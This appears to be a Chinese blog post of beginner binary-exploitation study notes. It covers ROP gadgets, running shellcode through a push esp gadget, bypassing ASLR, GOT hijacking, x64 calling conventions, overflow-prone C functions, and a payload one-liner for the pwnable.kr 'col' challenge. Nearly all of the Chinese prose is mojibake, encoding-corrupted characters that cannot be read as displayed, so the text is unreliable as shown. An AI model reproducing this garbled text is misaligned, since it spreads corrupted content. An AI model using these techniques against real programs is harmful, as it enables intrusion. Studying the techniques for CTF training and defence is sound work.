<p>é‚£ä¹ˆå¦‚æœè¦è°ƒç”¨å‡½æ•°ï¼Œå°±éœ€è¦å‚æ•°ï¼Œè€Œå‚æ•°è¢«å­˜å…¥åœ¨ä¸Šæ–¹åˆ—ä¸¾çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬è¦åšçš„å°±æ˜¯å‘å¯„å­˜å™¨å­˜å…¥æˆ‘ä»¬éœ€è¦çš„å‚æ•° ï¼š</p>
<p>1ï¼‰å¦‚æœåœ¨å†…å­˜ä¸­å·²ç»å­˜åœ¨æˆ‘ä»¬è¦çš„æ•°æ®ï¼Œå¯ç”¨movæŒ‡ä»¤æ¥å­˜å…¥ </p>
<p>2ï¼‰ç”¨popæŒ‡ä»¤æ¥å°†æ ˆé¡¶æ•°æ®å¼¹å…¥å¯„å­˜å™¨ï¼Œpop æ‰€ä¼ è¾“çš„æ•°æ®åº”è¯¥åœ¨ gadget åœ°å€ä¹‹åï¼Œå¦‚å›¾ï¼š</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/v2-07a48918aeb2f8b7dd2ddc4836a7b773_720w.png"></p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ push esp è¿™ä¸ªgadgetæ¥æ‰§è¡Œshellcode</p>
<p>å¯¹äºæ‰€æœ‰åŒ…å« pop æŒ‡ä»¤çš„ gadgetï¼Œåœ¨å…¶gadgetåœ°å€ä¹‹åéƒ½è¦æ·»åŠ  éœ€è¦popä¼ å…¥å¯„å­˜å™¨çš„æ•°æ®ï¼ŒåŒæ—¶åœ¨æ‰€æœ‰ gadget æœ€ååŒ…å«ä¸€æ®µshellcode</p>
<p>å¦‚æœåˆ©ç”¨ gadget è¯»å– ebp çš„å€¼å†åŠ ä¸ŠæŸä¸ªåˆé€‚çš„æ•°å€¼ï¼Œå°±å¯ä»¥ä¿è¯æº¢å‡ºæ•°æ®éƒ½å…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œè¿™æ ·å°±ä¸å†éœ€è¦è·å–ç¡®åˆ‡åœ°å€ï¼Œä¹Ÿå°±å…·æœ‰äº†<strong>ç»•è¿‡å†…å­˜éšæœºåŒ–ï¼ˆALSRï¼‰</strong>çš„å¯èƒ½ã€‚</p>
<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a><strong>Hijack GOT</strong></h3><h4 id="â€”â€”ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦å¤–ä¸€ä¸ªå‡½æ•°"><a href="#â€”â€”ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦å¤–ä¸€ä¸ªå‡½æ•°" class="headerlink" title="â€”â€”ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦å¤–ä¸€ä¸ªå‡½æ•°"></a>â€”â€”ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦å¤–ä¸€ä¸ªå‡½æ•°</h4><p>è¯¥æ–¹æ³•æ˜¯ç›´æ¥æŠŠå‡½æ•°ä¿®æ”¹æˆæˆ‘ä»¬éœ€è¦çš„å‡½æ•°ï¼Œä¸å†æ‰§è¡ŒåŸæ¥çš„å‡½æ•°ï¼Œè€Œä¸æ˜¯ä¸Šæ–¹æ‰§è¡ŒæŸä¸ªå‡½æ•°åç”±è¿”å›åœ°å€è¿›è¡Œè·³è½¬</p>
<p>å‡½æ•°åœ¨é“¾æ¥åº“ä¸­å®šä½æ‰€ç”¨åˆ°çš„å¤–éƒ¨å‡½æ•°ä¼šç”¨åˆ°GOTå’ŒPLTè¿™ä¸¤å¼ è¡¨ã€‚GOT å…¨ç§°æ˜¯å…¨å±€åç§»é‡è¡¨ï¼ˆ<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>ableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€ã€‚GOT å­˜å‚¨åœ¨æ•°æ®æ®µï¼ˆData Segmentï¼‰å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œä¸­è¢«ä¿®æ”¹ã€‚PLT å…¨ç§°æ˜¯ç¨‹åºé“¾æ¥è¡¨ï¼ˆ<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>ableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹ï¼ˆentryï¼‰ï¼Œæ¢è¨€ä¹‹ç¨‹åºæ€»ä¼šåˆ° PLT è¿™é‡Œå¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLT å­˜å‚¨åœ¨ä»£ç æ®µï¼ˆCode Segmentï¼‰å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ä¸”ä¸ä¼šè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥ PLT å¹¶ä¸ä¼šçŸ¥é“ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€é“¾æ¥åº“è¢«åŠ è½½çš„ç¡®åˆ‡ä½ç½®ã€‚é‚£ä¹ˆ PLT è¡¨å†…å­˜å‚¨çš„å…¥å£ç‚¹æ˜¯ GOT è¡¨ä¸­å¯¹åº”æ¡ç›®çš„åœ°å€ã€‚</p>
<p>ç¨‹åºéœ€è¦è°ƒç”¨æŸä¸ªå¤–éƒ¨å‡½æ•°æ—¶ï¼Œé¦–å…ˆåˆ° PLT è¡¨å†…å¯»æ‰¾å¯¹åº”çš„å…¥å£ç‚¹ï¼Œè·³è½¬åˆ° GOT è¡¨ä¸­ã€‚å¦‚æœè¿™æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œç¨‹åºä¼šé€šè¿‡ GOT  è¡¨å†æ¬¡è·³è½¬å› PLT è¡¨ï¼Œè¿è¡Œåœ°å€è§£æç¨‹åºæ¥ç¡®å®šå‡½æ•°çš„ç¡®åˆ‡åœ°å€ï¼Œå¹¶ç”¨å…¶è¦†ç›–æ‰ GOT  è¡¨çš„åˆå§‹å€¼ï¼Œä¹‹åå†æ‰§è¡Œå‡½æ•°è°ƒç”¨ã€‚å½“å†æ¬¡è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œç¨‹åºä»ç„¶é¦–å…ˆé€šè¿‡ PLT è¡¨è·³è½¬åˆ° GOT è¡¨ï¼Œæ­¤æ—¶ GOT  è¡¨å·²ç»å­˜æœ‰è·å–å‡½æ•°çš„å†…å­˜åœ°å€ï¼Œæ‰€ä»¥ä¼šç›´æ¥è·³è½¬åˆ°å‡½æ•°æ‰€åœ¨åœ°å€æ‰§è¡Œå‡½æ•°ã€‚</p>
<p>é€šè¿‡ä»¥ä¸Šçš„ä»‹ç»ï¼Œé‚£ä¹ˆå®ç°ä¿®æ”¹å‡½æ•°çš„åœ°æ–¹åœ¨äºGOTè¡¨é‡Œçš„å‡½æ•°åœ°å€ä¿®æ”¹ï¼Œè®©GOTæ‰§è¡Œçš„æ˜¯æˆ‘ä»¬éœ€è¦çš„å‡½æ•°å³å¯ã€‚æ—¢ç„¶è¿™æ ·ï¼Œæ¥ä¸‹æ¥éœ€è¦åšçš„å·¥ä½œæ˜¯æ‰¾åˆ°åŸå‡½æ•°çš„åœ¨GOTé‡Œçš„åœ°å€ï¼ˆGOTé‡Œå‡½æ•°çš„åœ°å€ç”±PLTè·³è½¬ï¼Œæ‰€ä»¥æ‰¾PLTä¸­å‡½æ•°çš„å…¥å£ç‚¹ï¼‰ä»¥åŠæˆ‘ä»¬éœ€è¦å‡½æ•°çš„åœ°å€ï¼ŒæŠŠæˆ‘ä»¬éœ€è¦çš„å‡½æ•°çš„åœ°å€æ›¿æ¢åˆ°GOT</p>
<p>å‡½æ•°åœ¨åŠ¨æ€é“¾æ¥åº“å†…çš„ç›¸å¯¹ä½ç½®æ˜¯<strong>å›ºå®šçš„</strong>ï¼Œåœ¨åŠ¨æ€åº“æ‰“åŒ…ç”Ÿæˆæ—¶å°±å·²ç»ç¡®å®šã€‚æ‰€ä»¥å‡å¦‚æˆ‘ä»¬çŸ¥é“äº†æŸå‡½æ•°è¿è¡Œæ—¶åœ°å€ï¼ˆè¯»å– GOT è¡¨å†…å®¹ï¼‰ï¼Œä¹ŸçŸ¥é“è¯¥å‡½æ•°å’Œæˆ‘ä»¬æ‰€éœ€å‡½æ•°åœ¨åŠ¨æ€é“¾æ¥åº“å†…çš„ç›¸å¯¹ä½ç½®ï¼Œå°±å¯ä»¥æ¨ç®—å‡ºå‡½æ•°çš„åœ°å€</p>
<p>æœ€ååœ¨GOTä¸­çš„æ›¿æ¢ä¿®æ”¹ï¼Œå°±éœ€è¦ç”¨åˆ°ä¸Šä¸€ä¸ªçš„ROPçš„æ–¹æ³•å®ç°</p>
<p>æ¥æºï¼š</p>
<p><a href="https://zhuanlan.zhihu.com/p/25816426">æ‰‹æŠŠæ‰‹æ•™ä½ æ ˆæº¢å‡ºä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆä¸Šï¼‰</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25892385">æ‰‹æŠŠæ‰‹æ•™ä½ æ ˆæº¢å‡ºä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆä¸‹ï¼‰</a></p>
<h3 id="äºŒã€x64æ¶æ„ä¸‹çš„æ ˆæº¢å‡º"><a href="#äºŒã€x64æ¶æ„ä¸‹çš„æ ˆæº¢å‡º" class="headerlink" title="äºŒã€x64æ¶æ„ä¸‹çš„æ ˆæº¢å‡º"></a>äºŒã€x64æ¶æ„ä¸‹çš„æ ˆæº¢å‡º</h3><p>x64ä½ä¸‹çš„åå…­ä¸ªé€šç”¨å¯„å­˜å™¨ï¼š</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/register.png"></p>
<p>éœ€è¦è¡¥å……ï¼šåœ¨gccä¸‹ç¼–è¯‘çš„æ‰æ˜¯æŠŠå‰å…­ä¸ªå‚æ•°ä¾æ¬¡æ”¾å…¥rdi,rsi,rdx,rcx,r8,r9ï¼Œè€Œå¦‚æœåœ¨VSç¼–è¯‘ç¯å¢ƒä¸‹çš„åªæœ‰å‰å››ä¸ªå‚æ•°ä¾æ¬¡æ”¾å…¥rcx,rdx,r8,r9</p>
<p>gccç¼–è¯‘ç¯å¢ƒï¼šåœ¨é€šç”¨å¯„å­˜å™¨ä¸­ï¼Œå‡½æ•°æ‰§è¡Œå‰åå¿…é¡»ä¿æŒåŸå§‹çš„å¯„å­˜å™¨æœ‰3ä¸ªï¼šæ˜¯rbxã€rbpã€rspã€‚rxå¯„å­˜å™¨ä¸­ï¼Œæœ€å4ä¸ªå¿…é¡»ä¿æŒåŸå€¼ï¼šr12ã€r13ã€r14ã€r15ã€‚</p>
<p>ä¿æŒåŸå€¼çš„æ„ä¹‰æ˜¯ä¸ºäº†è®©å½“å‰å‡½æ•°æœ‰å¯ä¿¡ä»»çš„å¯„å­˜å™¨ï¼Œå‡å°åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­çš„ä¿å­˜&amp;æ¢å¤æ“ä½œã€‚é™¤äº†rbpã€rspç”¨äºç‰¹å®šç”¨é€”å¤–ï¼Œå…¶ä½™5ä¸ªå¯„å­˜å™¨å¯éšæ„ä½¿ç”¨ã€‚</p>
<p>é€šç”¨å¯„å­˜å™¨ä¸­ï¼Œä¸å¿…å‡è®¾ä¿å­˜å€¼å¯éšæ„ä½¿ç”¨çš„å¯„å­˜å™¨æœ‰5ä¸ªï¼šæ˜¯raxã€rcxã€rdxã€rdiã€rsiã€‚å…¶ä¸­raxç”¨äºç¬¬ä¸€ä¸ªè¿”å›å¯„å­˜å™¨ï¼ˆå½“ ç„¶ä¹Ÿå¯ä»¥ç”¨äºå…¶å®ƒç”¨é€”ï¼‰ï¼Œrdxç”¨äºç¬¬äºŒä¸ªè¿”å›å¯„å­˜å™¨ï¼ˆåœ¨è°ƒç”¨å‡½æ•°æ—¶ä¹Ÿç”¨äºç¬¬ä¸‰ä¸ªå‚æ•°å¯„å­˜å™¨ï¼‰</p>
<p>x86å’Œx64ä¸‹çš„åˆ›å»ºæ ˆå¸§çš„è¿‡ç¨‹åŸºæœ¬ä¸€è‡´ï¼Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p>
<p>äºŒè€…ç®€å•åŒºåˆ«åœ¨äºè¢«è°ƒå‡½æ•°çš„å‚æ•°çš„å­˜å‚¨ä½ç½®</p>
<ul>
<li>x86<ul>
<li>å­˜å‚¨åœ¨ä¸»è°ƒå‡½æ•°çš„æ ˆå¸§ä¸­ï¼Œåœ¨å‡½æ•°è¿”å›åœ°å€çš„ä¸Šæ–¹</li>
</ul>
</li>
<li>x64<ul>
<li>å‡½æ•°çš„å‰å…­ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨RDI,RSI,RDX,RCX,R8,R9ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Š</li>
<li>å†…å­˜åœ°å€ä¸èƒ½å¤§äº 0x00007FFFFFFFFFFFï¼Œ<strong>6 ä¸ªå­—èŠ‚é•¿åº¦</strong>ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</li>
<li>æ ˆæŒ‰ç…§16å­—èŠ‚å¯¹é½ï¼ˆå°±æ˜¯è¯´æ ˆçš„å¤§å°æ˜¯16çš„å€æ•°ï¼‰</li>
</ul>
</li>
</ul>
<p>æ¥æºäº CTF-wiki </p>
<p>æ ˆæº¢å‡ºå±é™©å‡½æ•°ï¼š</p>
<p>ï¼ˆ1ï¼‰è¾“å…¥</p>
<ul>
<li>gets è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥\x00ï¼ˆâ€™\0â€™ï¼‰</li>
<li>scanf</li>
<li>vscanf</li>
<li>read</li>
</ul>
<p>ï¼ˆ2ï¼‰è¾“å‡º</p>
<ul>
<li>sprintf</li>
</ul>
<p>ï¼ˆ3ï¼‰å­—ç¬¦ä¸²å‡½æ•°</p>
<ul>
<li>strcat å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ°\x00ï¼ˆâ€™\0â€™ï¼‰åœæ­¢</li>
<li>strcpy å­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°\x00ï¼ˆâ€™\0â€™ï¼‰åœæ­¢</li>
<li>bcopy</li>
</ul>
<hr>
<p>è¡¥å……ï¼ˆä¸€äº›æˆ‘ä¸æ‡‚çš„çŸ¥è¯†ç‚¹ï¼‰ï¼š</p>
<p>1ã€ç³»ç»Ÿè°ƒç”¨è¾“å…¥å‡½æ•°*<em>read(int fd, void <em>buf, size_t count)</em></em></p>
<p>size_tï¼šè¡¨ç¤ºæ— ç¬¦å·æ•´æ•°</p>
<p>ssize_tï¼šè¡¨ç¤ºæœ‰ç¬¦å·æ•´æ•°</p>
<p>ï¼ˆ1ï¼‰fdï¼šå°†è¦è¯»å–æ•°æ®çš„æ–‡ä»¶æè¿°ç¬¦ï¼›bufï¼šæ‰€è¯»å–åˆ°çš„æ•°æ®çš„å†…å­˜ç¼“å†²ï¼›countï¼šéœ€è¦è¯»å–çš„æ•°æ®é‡ã€‚</p>
<p>ï¼ˆ2ï¼‰fdä¸º0æ—¶ï¼Œè¡¨ç¤ºä¸ºæ ‡å‡†è¾“å…¥ï¼ˆé”®ç›˜ä¸Šè·å–è¾“å…¥ï¼‰ï¼Œè¿™æ—¶ä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œè¾“å…¥çš„æ—¶å€™ï¼›bufå°±æ˜¯æŒ‡ä¸€å—å­˜å‚¨ç©ºé—´ï¼Œè·å–åˆ°çš„æ•°æ®å¡«å…¥è¿™é‡Œ</p>
<p>ï¼ˆ3ï¼‰å‡½æ•°**write(int fd, void *buf, size_t count)**ä¸ä¹‹å¯¹åº”ï¼Œæ˜¯å‘bufç¼“å­˜åŒºå†™å…¥ä¸€äº›æ•°æ®ï¼Œfdä¸º1æ—¶è¡¨ç¤ºä¸ºæ ‡å‡†è¾“å‡ºï¼ˆæ˜¾ç¤ºåœ¨æ˜¾ç¤ºå™¨ä¸Šï¼‰</p>
<p>ï¼ˆ4ï¼‰fd=2æ—¶è¡¨ç¤ºæ ‡å‡†é”™è¯¯ï¼Œè¿™0ï¼Œ1ï¼Œ2æ˜¯ç³»ç»Ÿé»˜è®¤ä½¿ç”¨çš„ï¼Œè€Œ3ï¼Œ4â€¦â€¦ç­‰ï¼Œå¯ä»¥ç”±ä½¿ç”¨è€…è‡ªè¡Œå†³å®š</p>
<p>ï¼ˆ5ï¼‰æˆåŠŸ<strong>è¿”å›è¯»å–çš„å­—èŠ‚æ•°</strong>ï¼Œå‡ºé”™è¿”å›-1å¹¶è®¾ç½®errnoï¼Œå¦‚æœåœ¨è°ƒreadä¹‹å‰å·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œåˆ™è¿™æ¬¡readè¿”å›0</p>
<p>2ã€<strong>atoi()</strong> åŠŸèƒ½æ˜¯æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°ï¼ˆintç±»å‹çš„ï¼‰ï¼Œè¿˜æœ‰ä¸ªç›¸åŒåŠŸèƒ½çš„**atol()**æ˜¯æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆé•¿æ•´å‹æ•°ï¼ˆlongç±»å‹çš„ï¼‰</p>
<p>3ã€pythonå‘é€æ•°æ®çš„å›ºå®šæ ¼å¼ä¸ºï¼š$(python -c â€œprint â€˜\xe8\x05\xd9\x1dâ€™ + â€˜\x01â€™*16â€™ â€œ)(è¿™é‡Œpwnable.kr colé¢˜ä½œä¸ºä¸€ä¸ªä¾‹å­ï¼Œå¼ºè°ƒè¿™é‡Œä¸ç”¨\x00æ˜¯å› ä¸ºä¼šé˜»æ–­)</p>
<p>éšæœºæ•°é—®é¢˜ä¸­çš„å‡½æ•°ï¼šrand() ï¼Œsrand()ï¼Œtime()</p>
<p>1ã€<strong>rand()<strong>åŸå‹ä¸ºï¼š</strong>int rand(void)</strong> ã€‚rand() ç”¨æ¥äº§ç”Ÿéšæœºæ•°ï¼Œä½†æ˜¯ï¼Œrand()çš„å†…éƒ¨å®ç°æ˜¯ç”¨çº¿æ€§åŒä½™æ³•å®ç°çš„ï¼Œæ˜¯ä¼ªéšæœºæ•°ï¼Œç”±äºå‘¨æœŸè¾ƒé•¿ï¼Œå› æ­¤åœ¨ä¸€å®šèŒƒå›´å†…å¯ä»¥çœ‹æˆæ˜¯éšæœºçš„</p>
<p>ï¼ˆ1ï¼‰**rand()**ä¼šè¿”å›ä¸€ä¸ªèŒƒå›´åœ¨0åˆ°RAND_MAXï¼ˆ32767ï¼‰ä¹‹é—´çš„ä¼ªéšæœºæ•°ï¼ˆæ•´æ•°ï¼‰</p>
<p>ï¼ˆ2ï¼‰ä½¿ç”¨rand()å‡½æ•°äº§ç”Ÿ0-99ä»¥å†…çš„éšæœºæ•´æ•°ï¼šint number1 = rand() % 100; (å¦‚æœè¦ç”Ÿæˆ1-100ï¼Œåœ¨åé¢åŠ 1å³å¯)</p>
<p>ï¼ˆ3ï¼‰å¦‚æœæ²¡æœ‰è®¾ç½®éšæœºæ•°ç§å­ï¼Œrand()å‡½æ•°åœ¨è°ƒç”¨æ—¶ï¼Œè‡ªåŠ¨è®¾è®¡éšæœºæ•°ç§å­ä¸º1ï¼ˆç›¸å½“äºsrand(1)çš„æƒ…å†µï¼‰ã€‚éšæœºç§å­ç›¸åŒï¼Œæ¯æ¬¡äº§ç”Ÿçš„éšæœºæ•°ä¹Ÿä¼šç›¸åŒã€‚</p>
<p>2ã€time()ï¼šæ˜¯Cè¯­è¨€è·å–å½“å‰ç³»ç»Ÿæ—¶é—´çš„å‡½æ•°ï¼Œä»¥ç§’ä½œå•ä½ï¼Œä»£è¡¨å½“å‰æ—¶é—´è‡ªUnixæ ‡å‡†æ—¶é—´æˆ³(1970å¹´1æœˆ1æ—¥0ç‚¹0åˆ†0ç§’ï¼ŒGMT)ç»è¿‡äº†å¤šå°‘ç§’</p>
<p>ï¼ˆ1ï¼‰ä¸€èˆ¬åœ¨éšæœºæ•°ä¸­ï¼Œä½¿ç”¨å½¢å¼ä¸ºtime(0),è·å–æ­£åœ¨å˜åŒ–çš„æ—¶é—´å€¼ï¼Œæ¥é…åˆsrand()å‡½æ•°è¿›è¡Œåˆå§‹åŒ–å‡½æ•°å‘ç”Ÿå™¨ï¼Œç”Ÿæˆä¸åŒçš„éšæœºæ•°</p>
<p>3ã€**srand()<strong>åŸå‹ä¸ºï¼š</strong>void srand (usigned int seed)**ã€‚ç”¨æ¥è®¾ç½®rand()äº§ç”Ÿéšæœºæ•°æ—¶çš„éšæœºæ•°ç§å­</p>
<p>ï¼ˆ1ï¼‰é€šå¸¸å¯ä»¥åˆ©ç”¨time(0)æˆ–geypid(0)çš„è¿”å›å€¼ä½œä¸ºseed</p>
<p>ï¼ˆ2ï¼‰ä½¿ç”¨srand()å‡½æ•°å¯ä»¥ç”¨æ¥ç»™rand()å‡½æ•°ç”Ÿæˆä¸ä¸€æ ·çš„éšæœºæ•°ç§å­</p>
<p>ï¼ˆ3ï¼‰ä½¿ç”¨rand()å’Œsrand()äº§ç”Ÿ0-99ä»¥å†…çš„çœŸæ­£çš„éšæœºæ•´æ•°:  srand(time(0));     int number1 = rand() % 100;</p>
<p>æ³¨ï¼šç”¨time(0)ä½œä¸ºéšæœºæ•°ç§å­æ—¶ï¼Œä¸¤æ¬¡ç¨‹åºè¿è¡Œçš„æ—¶é—´é—´éš”è¦è¶…è¿‡ä¸€ç§’ï¼Œå¦åˆ™ä¸¤æ¬¡è¿è¡Œå¾—åˆ°çš„éšæœºæ•°å°†ä¸€è‡´</p>
<p>4ã€**memcpy()**å‡½æ•°åŸå‹ä¸º **void *memcpy(void <em>destin, void <em>source, unsigned n)</em></em> åŠŸèƒ½ä¸ºï¼šä»æºsourceä¸­æ‹·è´nä¸ªå­—èŠ‚åˆ°ç›®æ ‡destinä¸­ï¼Œä¸ä¼šè‡ªåŠ¨åŠ ä¸Šâ€™\0â€™</p>
<p>5ã€**memset()<strong>åŸå‹ä¸ºï¼š</strong>void <em>memset(void <em>s, int ch, size_t n)</em></em>  åŠŸèƒ½ä¸ºå°†sä¸­å½“å‰ä½ç½®åé¢çš„nä¸ªå­—èŠ‚ç”¨ ch æ›¿æ¢å¹¶è¿”å› s </p>
<p>æ³¨ï¼šè¿™é‡Œç”¨chåšç¬¦å·ï¼Œæ˜¯å› ä¸ºè¯¥å‡½æ•°åªèƒ½å–chçš„ä½å…«ä½æ•°ï¼Œå–å€¼èŒƒå›´ä¸º0~255ï¼Œè·Ÿå­—ç¬¦çš„å–å€¼ä¸€æ ·</p>
<p>6ã€memcmp()å‡½æ•°åŸå‹ä¸º**int memcmp(const void *str1, const void *str2, size_t n)**åŠŸèƒ½ä¸ºæ¯”è¾ƒå†…å­˜åŒºåŸŸbuf1å’Œbuf2çš„å‰nä¸ªå­—èŠ‚ï¼Œstr1&gt;str2,è¿”å›æ­£æ•°ï¼›str1=str2è¿”å›0ï¼›str1&lt;str2è¿”å›è´Ÿæ•°ï¼Œæ¯”å¤§å°æ—¶ï¼Œä¸€æ—¦èƒ½ç¡®è®¤å¤§å°åˆ™åœæ­¢æ¯”è¾ƒï¼Œç›´æ¥è¿”å›æ•°å€¼</p>
<p>7ã€rax eax ax ah alåˆ†åˆ«æ˜¯ï¼š64ä½ã€ä½32ä½ã€ä½16ä½ã€axçš„é«˜8ä½ã€axçš„ä½8ä½</p>
<p>8ã€**strchr()<strong>å‡½æ•°åŸå‹ä¸ºï¼š</strong>char *strchr(const char *str, int c)**åŠŸèƒ½ä¸ºåœ¨stræ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ä¸­æœç´¢ç¬¬ä¸€æ¬¡å‡ºç°ASCIIç å€¼ä¸ºcçš„å­—ç¬¦çš„ä½ç½®ï¼Œè‹¥å­˜åœ¨åˆ™è¿”å›è¯¥å­—ç¬¦çš„åœ°å€ï¼Œå¦åˆ™è¿”å›NULL</p>
<p>9ã€violatileå…³é”®å­—é€šå¸¸ç”¨æ¥ä¿®é¥°å¤šçº¿ç¨‹å…±äº«çš„å…¨å±€å˜é‡å’ŒIOå†…å­˜ã€‚å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œä¸è¦æŠŠæ­¤ç±»å˜é‡ä¼˜åŒ–åˆ°å¯„å­˜å™¨ä¸­ï¼Œæ¯æ¬¡éƒ½è¦è€è€å®å®çš„ä»å†…å­˜ä¸­è¯»å–ï¼Œå› ä¸ºå®ƒä»¬éšæ—¶éƒ½å¯èƒ½å˜åŒ–ã€‚</p>
<p>10ã€å‡½æ•°è¿”å›å€¼æ˜¯é€šè¿‡å¯„å­˜å™¨è¿›è¡Œè¿”å›çš„ã€‚ç¼–è¯‘å™¨ä½¿ç”¨eaxä½œä¸ºå­˜å‚¨è¿”å›å€¼çš„å¯„å­˜å™¨ï¼Œè¢«è°ƒå‡½æ•°åœ¨retå‰è®¾ç½®eaxï¼Œè¿”å›åï¼Œä¸»è°ƒå‡½æ•°ä»eaxè·å–åˆ°è¯¥å€¼ã€‚</p>
<p>11ã€**mprotect()<strong>å‡½æ•°åŸå‹ä¸º</strong>int mprotect(const void *start, size_t len, int prot)**åŠŸèƒ½ä¸ºmprotect()å‡½æ•°æŠŠè‡ªstartå¼€å§‹çš„ã€é•¿åº¦ä¸ºlençš„å†…å­˜åŒºçš„ä¿æŠ¤å±æ€§ä¿®æ”¹ä¸ºprotæŒ‡å®šçš„å€¼ï¼ˆå¯è¯»ä¸º4ï¼Œå¯å†™ä¸º2ï¼Œå¯æ‰§è¡Œä¸º1ï¼‰ä¸€èˆ¬ç›´æ¥å–7ã€‚</p>
<p>12ã€<strong>xxd</strong>å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„åå…­è¿›åˆ¶å€¼ï¼Œ<strong>xxd æ–‡ä»¶å | tail</strong>å¯ä»¥æ‰“å°åå…­è¿›åˆ¶å€¼ä¸­çš„æœ«å°¾æ•°æ®ã€‚å¦‚æœæ–‡ä»¶æ˜¯è¢«åŠ ä¸Šäº†upxå‹ç¼©å£³ï¼Œå¯ä»¥è¾“å…¥<strong>upx -d</strong> æ–‡ä»¶å è¿›è¡Œè§£å‹</p>
<p>13ã€**fflush(stdin)**æ˜¯æ¸…ç©ºè¾“å…¥ç¼“å†²åŒºçš„æ„æ€</p>
<p>14ã€<strong>malloc</strong>å‡½æ•°åŸå‹ä¸ºä¸º**void *malloc(unsigned int size)**ï¼›å…¶ä½œç”¨æ˜¯åœ¨å†…å­˜çš„åŠ¨æ€å­˜å‚¨åŒºä¸­åˆ†é…ä¸€ä¸ªé•¿åº¦ä¸ºsizeçš„è¿ç»­ç©ºé—´ã€‚æ­¤å‡½æ•°çš„è¿”å›å€¼æ˜¯åˆ†é…åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œæˆ–è€…è¯´ï¼Œæ­¤å‡½æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆå‹å‡½æ•°ï¼Œè¿”å›çš„æŒ‡é’ˆæŒ‡å‘è¯¥åˆ†é…åŸŸçš„å¼€å¤´ä½ç½®ã€‚</p>
<p>åˆ†é…æˆåŠŸåˆ™è¿”å›æŒ‡å‘è¢«åˆ†é…å†…å­˜çš„æŒ‡é’ˆ(æ­¤å­˜å‚¨åŒºä¸­çš„åˆå§‹å€¼ä¸ç¡®å®š)ï¼Œå¦åˆ™è¿”å›ç©ºæŒ‡é’ˆNULLã€‚å½“åŠ¨æ€å†…å­˜ä¸å†ä½¿ç”¨æ—¶ï¼Œåº”ä½¿ç”¨free()å‡½æ•°å°†å†…å­˜å—é‡Šæ”¾ã€‚</p>
<p>15ã€setvbufåŸå‹ <strong>int setvbuf(FILE *stream, char *buf, int type, unsigned size)</strong> ç”¨äºè®¾å®šæ–‡ä»¶æµçš„ç¼“å†²åŒº</p>
<p>type ï¼š æœŸæœ›ç¼“å†²åŒºçš„ç±»å‹ï¼š</p>
<p>_IOFBF(æ»¡ç¼“å†²ï¼‰ï¼šå½“ç¼“å†²åŒºä¸ºç©ºæ—¶ï¼Œä»æµè¯»å…¥æ•°æ®ã€‚æˆ–è€…å½“ç¼“å†²åŒºæ»¡æ—¶ï¼Œå‘æµå†™å…¥æ•° æ®ã€‚</p>
<p>_IOLBF(è¡Œç¼“å†²ï¼‰ï¼šæ¯æ¬¡ä»æµä¸­è¯»å…¥ä¸€è¡Œæ•°æ®æˆ–å‘æµä¸­å†™å…¥ä¸€è¡Œæ•°æ®ã€‚</p>
<p>_IONBF(æ— ç¼“å†²ï¼‰ï¼šç›´æ¥ä»æµä¸­è¯»å…¥æ•°æ®æˆ–ç›´æ¥å‘æµä¸­å†™å…¥æ•°æ®ï¼Œè€Œæ²¡æœ‰ç¼“å†²åŒºã€‚</p>
<p>size ï¼š ç¼“å†²åŒºå†…å­—èŠ‚çš„æ•°é‡ã€‚</p>
